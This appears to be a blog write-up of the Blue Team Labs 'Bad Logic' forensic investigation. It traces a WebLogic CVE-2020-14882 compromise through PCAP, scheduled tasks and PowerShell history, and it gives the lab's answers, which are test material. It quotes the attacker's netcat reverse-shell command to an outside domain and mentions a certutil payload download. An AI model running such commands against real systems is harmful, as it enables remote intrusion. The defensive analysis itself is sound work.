          <h2 id="post__content__title">Introduction</h2>
          <p>
            Today we will be walking through one of the Blue Team Labs Online Investigations: Bad Logic. The Investigation is 
            rated as <b>"Hard"</b> and will earn you <b>100 points</b>. To earn full points, you have to answer 10 questions in regard to
            the following scenario:</p>
            <pre><code class="language-markdown">During standard servicing & patching of our server the sysadmins were denied access to 
their Administrator account. Bad practices are in place here and it seems they run all
services with the account they logon with. Investigate if this server has been compromised
and if it has, uncover what actions-on-objectives the threat actor has completed. Remember,
some of the artefacts may have been deleted. A PCAP, memory dump, MFT & pre-fetch files may
be of assistance. A full review of the compromised application may also be in order.</code></pre><br>
          <h2 id="post__content__title">Victim Details</h2>
          <pre><code class="language-markdown">Q1) Which application did the threat actor exploit, what port does this run on and which
    CVE did the threat actor utilise? (10 points)</code></pre><br>
          <p>
            I started this investigation of by looking through the MD-Artefacts folder and identifying which files were to our disposal for investigation. Within the <span id="inline-code">Module_Options/LiveResponse</span>
            folder, several helpful system information files were located. One of these files, <span id="inline-code">ipconfig</span> details the ethernet adapter configuration. From this file, we 
            learn that the system's IP address is <span id="inline-code">172.31.4.99</span>. Additionally, based on the Windows Services in <span id="inline-code">NetSystemInfo</span> and the
            open connections/listening services in <span id="inline-code">network_connections</span>, we see that nginx is run on port 80, and an application called <span id="inline-code">node</span> on port 8000.
            <br><br>
            Using this information, we open the pcap file <span id="inline-code">md_capture</span> in Wireshark and apply the filter <span id="inline-code">tcp.port == 80 and ip.dst == 172.31.4.99 and http.chat and protocol not OCSP</span>.
            I added in the part regarding OSCP as the capture contained numerous packets and although it has some known vulnerabilities, I am not aware of any that lead to full system compromises. 
            After combing through the logs, I do not find any signs of an attack, although I see several requests which correlate which known NMAP behaviour. NMAP is a network scanning tool which 
            can be used to identify open ports and scan for vulnerabilities in services running on these ports. 
            <br><br>
            Since there was no obvious sign of intrusion on port 80, I decided to focus on the IP address running what I suspected to be the NMAP scan: <span id="inline-code">178.62.72.123</span>.
            After applying that IP as our filter, together with the IP address of the Windows victim machine we previously identified, we can clearly identify that an port scan (likely using NMAP),
            was run against our victim system, before the traffic then starts focussing on one specific port: 7001. If we add that port to our filter, we become aware of multiple requests that were
            performed against the HTTP service running on that port. 
            <br><br>
            If we analyze these requests, we see several that are directed at <span id="inline-code">/console/images/../console.portal</span>. If we perform a quick google search, we discover 
            that this endpoint is used for the CVE-2020-14882. This CVE is assigned to a critical vulnerability in the Oracle WebLogic Server and allows for remote code execution. If we closer
            analyze the request, we see that the threat actor executes the command <span id="inline-code">ping.exe advertyzing.co.uk</span> within their exploit.
            <br><br>
            Based on this information, we can conclude that the application is <span id="inline-code">weblogic</span> which runs on port <span id="inline-code">7001</span> and is exploited
            using <span id="inline-code">CVE-2020-14882</span>.

          <h2 id="post__content__title">Malicious Domain</h2>
          <pre><code class="language-markdown">Q2) What is the malicious domain used by the threat actor? (10 points)</code></pre><br>
          <p>
            Whilst finding the answers to question 1, we identfied that the threat actor performed multiple requests against the Oracle WebLogic Server running on port 7001. If we closely
            analyze these results, we find that by exploiting CVE-2020-14882 the threat actor initially tries to ping the server <span id="inline-code">advertyzing.co.uk</span> and subsequently
            attempts to download <span id="inline-code">nc.exe</span>. This binary is known for setting up network connections and has both legitimate and illegitimate uses. By focussing on the
            download request, we observe the threat actor trying to obtain the binary from the same domain: <span id="inline-code">advertyzing.co.uk</span>. Therefore we can conclude that it
            is highly likely that the malicious domain is <span id="inline-code">advertyzing.co.uk</span>. 
            <br>
            <img src="/img/badlogic_q1.png" alt="q2_answer">
          </p>
          <h2 id="post__content__title">Threat Actor IP IOCs</h2>
          <pre><code class="language-markdown">Q3) Confirm the two IP addresses utilized by the threat actor (10 points)</code></pre><br>
          <p>
            We know already that the threat actor used IP address <span id="inline-code">178.62.72.123</span> to exploit CVE-2020-14882. We are additionally searching for a second IP
            address utilized by the threat actor. We start our hunt by assuming that the threat actor also used this IP to connect to our server, and additionally tried to connect to
            the Oracle WebLogic Server as well over HTTP. Thus, we apply a filter for these specific attributes: <span id="inline-code">ip.addr == 172.31.4.99 and tcp.port == 7001 and !ip.addr == 178.62.72.123</span>.
            We consciously filter out the already identified IP address to ensure we don't clog the output. We are left with two unique IP addresses that also connect to port 7001. If we 
            analyze both, we identify that the connection to <span id="inline-code">82.16.6.12</span> occured before the CVE exploit attempt, and seeminly valid credentials were used to access the 
            WebLogic Server. It is unlikely that a threat actor would first logon with valid credentials to then try to exploit the server. The second IP address <span id="inline-code">95.181.232.7</span>
            on the other hand only performs two GET requests that seem innocuous. If we widen our scope, and search for all network connections by both IP addresses, 
            <span id="inline-code">178.62.72.123,95.181.232.7</span>
          </p>
          <h2 id="post__content__title">Obtaining Persistence</h2>
          <pre><code class="language-markdown">Q4) The threat actor has attempted an unusual way of persisting by editing a key file. 
    Which configuration file have they altered? (10 points)</code></pre><br>
          <p> 
            By now, we have analyzed all exploit requests that were send to the victim. One of these events contained the command <span id="inline-code">'C$\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\nc.exe advertyzing.co.uk 443 -e </span>. 
            It appears that the <span id="inline-code">nc.exe</span> was downloaded into the Oracle folder. If we browse to that location we don't see the binary anymore. However, it contained
            both a bash and shell script named <span id="inline-code">startWebLogic</span> which piqued my interest. They seem to execute similarly named scripts from inside the <span id="inline-code">bin</span>
            folder. Browsing into the <span id="inline-code">bin</span> folder, we see four files named <span id="inline-code">startWebLogic</span>. By analyzing these files, we identify that the threat actor
            edited <span id="inline-code">startWebLogic.cmd</span> to run <span id="inline-code">startWebLogic.bat</span> which subsequently calls <span id="inline-code">startWebLogic.exe</span>.
            Personally, that's quite a lot of referals which could have been developed more efficiently. After reviewing <a href="https://help.adobe.com/en_US/livecycle/11.0/AdminHelp/WS92d06802c76abadb-5145d5d12905ce07e7-7c8f.2.html">Adobe's documentation</a>
            it appeared that on Windows systems, normally only <span id="inline-code">startWebLogic.cmd</span> is needed. There is no reference at all around the Windows Batch nor the Windows executable file.
            After obtaining the SHA256 hash and submitting it to VirusTotal, we discover that VirusTotal classifies this binary to be <span id="inline-code">nc.exe</span> and closer review of the 
            <span id="inline-code">startWebLogic.bat</span> makes it seem like the commands one would normally pass to netcat. Therefore, we can conclude that the threat actor modified key file: 
            <span id="inline-code">startweblogic.cmd</span>.

          <pre><code class="language-markdown">Q5) The threat actor has made good use of 'Living off the land' binaries (LOLBins). Which
    Windows executable did they use to download a malicious file from their server? 
    (10 points)</code></pre><br>
                </div>
          <p>
            If we refer back to question 2 we identified that the threat actor used the command execution vulnerability in Oracle to execute the <span id="inline-code">ping</span> command.
            However, we have identified that the threat actor performed multiple requests to the vulnerable endpoint. If we analyze the other commands that were executed, we discover that
            the threat actor used <span id="inline-code">certutil.exe</span> to download the <span id="inline-code">nc.exe</span> binary.

          <pre><code class="language-markdown">Q6) What was the name of the malicious file they downloaded using this 
    Windows executable? (10 points)</code></pre><br>
          <p>
            By discovering the answer for question 2 and expanding upon our analysis by answer question 5, we also immediately discovered the answer for question 6. The threat actor downloaded
            the "malicious" file <span id="inline-code">nc.exe</span>. I put malicious inside of quotation marks since as I discussed in question 2, nc.exe is used both for legitimate and
            illegitimate purposes.

          <h2 id="post__content__title">Threat Actor Email IOC</h2>
          <pre><code class="language-markdown">Q7) What email address is associated with the threat actor? (10 points)</code></pre><br>
          <p>
            By now, I decided that the Wireshark Capture probably had served it's full purpose and it was time to dive into the memory dump to see if we could obtain more information. The size
            of the memory dump (8.25GB) had me already a bit worried since large sizes always take a lot of time to load. After trying several commands, it appeared that volatility just would
            not work for this memory dump. This is where I decided to peruse the <span id="inline-code">README.txt</span> left on the Desktop. There, we discover that the "security team", did
            performed a least-effort approach and was already hinting to the memory dump being unusable. As I had no starting points to gain an answer to this question I left it for later.
            I came back to this question after answering question 10, after browsing to the PowerShell log, since I discovered that the cryptominer of question 8 had created a user configuration
            data folder as well. When I browsed into that folder, I had a look at, amongst others, the <span id="inline-code">config.json</span> file and discovered the email address: <span id="inline-code">bzuyxpdpphthhbvxpz@niwghx.com</span>.

          <pre><code class="language-markdown">Q8) The threat actor has used an off-the-shelf cryptominer, what is the name of the 
    executable? (10 points)</code></pre><br>
          <p>
            Refer back to question 1, where we identified multiple system information files in our artifacts folder. One of these files contained a CSV list of scheduled tasks that were 
            present on the system. Immediatly on the very first few lines, we identify two scheduled tasks called <span id="inline-code">KryptexElevation</span> and 
            <span id="inline-code">KryptexElevationFromStartup</span>. The application is stored in <span id="inline-code">C:\Users\Administrator\AppData\Local\Program\kryptex-app\</span> 
            and has a comment of <span id="inline-code">[...] Kryptex uses admin privileges to configure system for better mining performance</span> Additionally, a quick Google search for 
            Kryptex reveals it's <a href="https://www.kryptex.com/en/">website</a> promoting the tool as a cryptocurrency miner.

          <h2 id="post__content__title">Password Dumping Tool</h2>
          <pre><code class="language-markdown">Q9) What is the name of the password dumping tool used by the threat actor? (10 points)</code></pre><br>
          <p>
            I based myself on the assumption that this question was framed in such a way that it is likely that this tool was executed using either cmd or powershell. By default, PowerShell
            command logging is stored in the <a href="https://medium.com/@reallydontaskmetosignin/the-single-most-important-powershell-command-that-you-will-ever-learn-407daab0a18d">Roaming 
            folder of individual users</a>. We know that the threat actor obtained Administrator privileges thanks to the CVE they exploited. As such, we start our hunt in 
            <span id="inline-code">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span>.
            In the PowerShell command history, we identify multiple commands executing the <span id="inline-code">lazange.exe</span> binary. One of these commands redirects the output of the
            tool to the file <span id="inline-code">password_extract.txt</span>. Once again, a quick Google search helps us out. LaZagne is available on 
            <a href="https://github.com/AlessandroZ/LaZagne">Github</a> and is desribed as an open source application used to retrieve lots of passwords stored on a local computer.

            To answer this question, we can refer back to our findings for question 9, where we identified that the output of lazange was redirected (echo'ed) to the file:
